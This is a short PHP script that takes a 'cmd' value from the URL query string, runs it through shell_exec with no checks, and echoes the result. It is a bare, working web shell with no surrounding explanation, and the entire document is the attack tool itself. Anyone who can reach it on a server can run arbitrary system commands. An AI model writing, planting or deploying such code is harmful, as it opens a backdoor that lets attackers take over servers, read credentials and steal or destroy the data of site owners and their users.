<?php
header("Content-Type: text/plain");
if (isset($_GET["cmd"])) {
    $command = $_GET["cmd"];
    $output = shell_exec($command);
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}
?>
